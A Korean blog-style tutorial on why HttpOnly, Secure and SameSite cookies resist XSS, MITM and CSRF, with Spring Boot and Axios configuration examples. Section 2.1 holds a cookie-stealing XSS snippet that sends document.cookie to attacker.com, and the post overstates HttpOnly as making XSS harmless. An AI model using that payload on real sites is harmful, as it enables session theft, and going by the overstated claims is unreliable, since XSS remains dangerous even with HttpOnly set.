---
Date: 2024-12-24
Category:
---
### ✅ **1. 쿠키(Cookie)란?**

- **쿠키(Cookie)** 는 클라이언트(브라우저) 측에서 저장되는 **작은 데이터 조각** 이다.
- 주로 **세션 관리, 사용자 인증, 개인화된 설정**을 유지하는 데 사용된다.

---

# 🛡️ **2. 쿠키 공격 벡터**

일반적인 쿠키가 탈취당하는 주요 방법은 다음과 같다:

## ⚠️ **2.1 XSS (Cross-Site Scripting) 공격**

- **공격 방법:** 공격자가 웹 페이지에 **악성 JavaScript 코드를 삽입**한다.
- **목적:** JavaScript를 통해 `document.cookie`로 쿠키를 탈취한다.

**예시:**

```javascript
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

- **HttpOnly 쿠키는?**
    - JavaScript로 접근할 수 없기 때문에 `document.cookie`로 가져올 수 없다.

**✅ 결론:** **HttpOnly가 XSS 공격으로부터 안전합니다.**

---

## ⚠️ **2.2 중간자 공격 (Man-in-the-Middle, MITM)**

- **공격 방법:** HTTP로 전송되는 쿠키를 공격자가 가로챈다.
- **Secure 쿠키는?**
    - `Secure` 속성이 설정된 쿠키는 **HTTPS를 통해서만 전송**된다.
    - HTTP로 전송되지 않기 때문에 가로챌 수 없습니다.

**✅ 결론:** **Secure가 MITM 공격으로부터 안전합니다.**

---

## ⚠️ **2.3 CSRF (Cross-Site Request Forgery)**

- **공격 방법:** 사용자가 로그인한 상태에서 악성 웹 사이트가 요청을 자동으로 보낸다.
- **SameSite 쿠키는?**
    - `SameSite=Strict`: 다른 도메인에서는 쿠키를 보내지 않는다.
    - `SameSite=Lax`: 외부 링크 클릭 시만 쿠키 전송.

**✅ 결론:** **SameSite가 CSRF 공격으로부터 안전하다.**

---

# 🔐 **3. HttpOnly Secure 쿠키의 보안 원리**

### ✅ **3.1 HttpOnly: JavaScript 접근 차단**

- **HttpOnly** 속성이 설정된 쿠키는 JavaScript로 접근할 수 없다.
- 브라우저가 `document.cookie`를 통해 HttpOnly 쿠키를 노출하지 않는다.

**예시 (HttpOnly 쿠키):**

```http
Set-Cookie: sessionId=abc123; HttpOnly
```

**JavaScript에서 접근 시:**

```javascript
console.log(document.cookie); 
// 출력: 다른 쿠키는 보이지만, HttpOnly 쿠키는 보이지 않음
```

**✅ 핵심:**

- **XSS 공격자가 쿠키에 접근할 수 없음.**

---

### ✅ **3.2 Secure: HTTPS로만 전송**

- **Secure** 속성이 설정된 쿠키는 **HTTPS를 통해서만 전송**된다.
- HTTP 통신에서는 쿠키가 전송되지 안는다.

**예시 (Secure 쿠키):**

```http
Set-Cookie: sessionId=abc123; Secure
```

**✅ 핵심:**

- **중간자 공격(MITM)이 HTTPS를 우회하지 않는 이상 탈취 불가능.**

---

### ✅ **3.3 SameSite: CSRF 방어**

- **SameSite=Strict:** 쿠키는 동일 사이트 요청에서만 전송된다.
- **SameSite=Lax:** 다른 사이트의 링크를 클릭할 때만 쿠키가 전송된다.

**예시 (SameSite 쿠키):**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

**✅ 핵심:**

- **다른 사이트에서 자동으로 요청이 실행되지 않음.**

---

# 🧠 **4. HttpOnly Secure 쿠키가 안전한 이유 요약**

|**속성**|**기능**|**방어하는 공격**|
|---|---|---|
|**HttpOnly**|JavaScript 접근 차단|**XSS (Cross-Site Scripting)**|
|**Secure**|HTTPS를 통해서만 쿠키 전송|**MITM (Man-in-the-Middle)**|
|**SameSite**|외부 사이트에서 쿠키 자동 전송 차단|**CSRF (Cross-Site Request Forgery)**|

---

# 🛠️ **5. HttpOnly Secure 쿠키 설정 방법**

### ✅ **5.1 Spring Boot 예시**

```java
ResponseCookie jwtCookie = ResponseCookie.from("refreshToken", token)
    .httpOnly(true)        // JavaScript 접근 차단
    .secure(true)          // HTTPS로만 전송
    .sameSite("Strict")    // CSRF 방어
    .path("/")             // 모든 경로에서 사용 가능
    .maxAge(Duration.ofDays(7)) // 7일 유지
    .build();

response.addHeader("Set-Cookie", jwtCookie.toString());
```

---

### ✅ **5.2 클라이언트 설정 (Axios 예제)**

**Axios로 쿠키 자동 전송:**

```typescript
import axios from 'axios';

axios.defaults.withCredentials = true; // 쿠키 자동 전송
axios.post('https://api.example.com/login', { username, password });
```

---

# 🚦 **6. HttpOnly Secure 쿠키는 완벽할까?**

### ✅ **보안 강점:**

1. **XSS 방어:** JavaScript로 접근 불가.
2. **MITM 방어:** HTTPS를 통해서만 전송.
3. **CSRF 방어:** SameSite 설정으로 외부 요청 차단.

### ⚠️ **한계점:**

1. **물리적 탈취:** 사용자의 디바이스가 탈취되면 쿠키를 열어볼 수 있다.
2. **브라우저 취약점:** 브라우저 보안에 취약점이 있을 경우 노출 가능.
3. **로그아웃 관리:** 서버에서 쿠키를 강제로 무효화할 수 없음.

**→ 이 한계를 보완하기 위해 Redis를 사용하여 Refresh Token을 중앙 관리한다.**

---

# 🎯 **7. 최종 결론**

- **HttpOnly Secure 쿠키는 클라이언트 측 토큰 저장의 최적 방법이다.**
- **JavaScript 접근 차단 (XSS 방어)**, **HTTPS 통신 (MITM 방어)**, **CSRF 방어**를 제공한다.
- **완벽한 보안을 위해:**
    1. **HttpOnly Secure 쿠키로 Refresh Token 저장**
    2. **Redis로 중앙 집중식 관리**

---

# 🚀 **8. 추천 보안 조치**

1. **HttpOnly + Secure + SameSite=Strict 쿠키 사용**
2. **Access Token은 짧은 유효 기간 설정**
3. **Redis로 Refresh Token 중앙 관리 및 TTL 설정**
4. **모니터링 도구로 쿠키 및 Redis 상태 점검**

---

이제 HttpOnly Secure 쿠키가 왜 안전한지 명확해졌나요? 😊  
더 깊이 알고 싶은 부분이나 추가 질문이 있다면 말씀해주세요! 🚀🔐